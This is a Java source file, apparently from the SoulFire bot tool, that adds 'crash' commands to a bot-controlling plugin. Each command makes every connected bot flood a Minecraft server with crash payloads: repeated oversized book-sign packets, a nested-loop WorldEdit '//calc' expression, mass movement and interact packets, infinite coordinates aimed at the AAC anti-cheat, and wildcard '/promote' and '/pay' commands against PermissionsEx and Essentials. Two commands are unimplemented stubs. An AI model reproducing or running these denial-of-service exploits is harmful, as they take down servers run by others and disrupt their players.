/*
 * SoulFire
 * Copyright (C) 2024  AlexProgrammerDE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package net.pistonmaster.soulfire.server.plugins;

import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.help;
import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.literal;

import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
import com.github.steveice10.mc.protocol.packet.common.serverbound.ServerboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
import com.mojang.brigadier.Command;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import net.lenni0451.lambdaevents.EventHandler;
import net.pistonmaster.soulfire.server.api.SoulFireAPI;
import net.pistonmaster.soulfire.server.api.event.lifecycle.CommandManagerInitEvent;

public class CrashExploits implements InternalPlugin {
  @EventHandler
  public static void onDispatcherInit(CommandManagerInitEvent event) {
    var manager = event.commandManager();
    manager
        .dispatcher()
        .register(
            literal("crash")
                .then(
                    literal("book")
                        .executes(
                            help(
                                "Attempts to crash the server with a book",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with a book");

                                  try {
                                    var data = Files.readAllBytes(Path.of("book.cap"));
                                    var packet =
                                        new ServerboundCustomPayloadPacket("MC|BSign", data);
                                    return manager.forEveryBot(
                                        c,
                                        (bot) -> {
                                          for (var i = 0; i < 150; i++) {
                                            bot.sessionDataManager().sendPacket(packet);
                                          }
                                          return Command.SINGLE_SUCCESS;
                                        });
                                  } catch (IOException e) {
                                    c.getSource().sendError("Failed to read book.cap", e);
                                    return Command.SINGLE_SUCCESS;
                                  }
                                })))
                .then(
                    literal("calc")
                        .executes(
                            help(
                                "Attempts to crash the server with a WorldEdit calculation",
                                c -> {
                                  c.getSource()
                                      .sendInfo(
                                          "Attempting to crash the server with a WorldEdit calculation");

                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {
                                        bot.botControl()
                                            .sendMessage(
                                                "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("fly")
                        .executes(
                            help(
                                "Attempts to crash the server with flying fast",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with flying fast");

                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {
                                        var botX = bot.sessionDataManager().clientEntity().x();
                                        var botY = bot.sessionDataManager().clientEntity().y();
                                        var botZ = bot.sessionDataManager().clientEntity().z();

                                        while (botY < 256) {
                                          botY += 9;
                                          var packet =
                                              new ServerboundMovePlayerPosPacket(
                                                  true, botX, botY, botZ);
                                          bot.sessionDataManager().sendPacket(packet);
                                        }

                                        for (var i = 0; i < 10000; i++) {
                                          botX += 9;
                                          var packet =
                                              new ServerboundMovePlayerPosPacket(
                                                  true, botX, botY, botZ);
                                          bot.sessionDataManager().sendPacket(packet);
                                        }

                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("sleep")
                        .executes(
                            help(
                                "Attempts to crash the server with sleeping",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with sleeping");

                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {

                                        // TODO: 17/02/2024 check if there is a specific packet for
                                        // leaving bed
                                        var packet =
                                            new ServerboundInteractPacket(
                                                bot.sessionDataManager().clientEntity().entityId(),
                                                InteractAction.INTERACT,
                                                Hand.MAIN_HAND,
                                                false);

                                        for (var i = 0; i < 2000; i++) {
                                          bot.sessionDataManager().sendPacket(packet);
                                        }

                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("permissionsex")
                        .executes(
                            help(
                                "Attempts to crash the server with PermissionsEx",
                                c -> {
                                  c.getSource()
                                      .sendInfo(
                                          "Attempting to crash the server with PermissionsEx");

                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {
                                        bot.botControl().sendMessage("/promote * a");
                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("aac")
                        .executes(
                            help(
                                "Attempts to crash the server with AAC",
                                c -> {
                                  c.getSource().sendInfo("Attempting to crash the server with AAC");
                                  // TODO: 17/02/2024 find old version of AAC crack to test
                                  var packet =
                                      new ServerboundMovePlayerPosPacket(
                                          true,
                                          Double.NEGATIVE_INFINITY,
                                          Double.NEGATIVE_INFINITY,
                                          Double.NEGATIVE_INFINITY);
                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {
                                        bot.sessionDataManager().sendPacket(packet);
                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("essentials")
                        .executes(
                            help(
                                "Attempts to crash the server with Essentials",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with Essentials");

                                  return manager.forEveryBot(
                                      c,
                                      (bot) -> {
                                        bot.botControl().sendMessage("/pay * a a");
                                        return Command.SINGLE_SUCCESS;
                                      });
                                })))
                .then(
                    literal("anvil")
                        .executes(
                            help(
                                "Attempts to crash the server with an anvil",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with an anvil");

                                  c.getSource().sendError("Anvil crash is not implemented yet!");

                                  // try damage 3 and 16384
                                  return Command.SINGLE_SUCCESS;
                                })))
                .then(
                    literal("chest")
                        .executes(
                            help(
                                "Attempts to crash the server with a chest",
                                c -> {
                                  c.getSource()
                                      .sendInfo("Attempting to crash the server with a chest");

                                  c.getSource().sendError("Chest crash is not implemented yet!");

                                  // create huge NBT data on chest and place the most possible chest
                                  // to "crash" the area
                                  return Command.SINGLE_SUCCESS;
                                }))));
  }

  @Override
  public void onLoad() {
    SoulFireAPI.registerListeners(CrashExploits.class);
  }
}
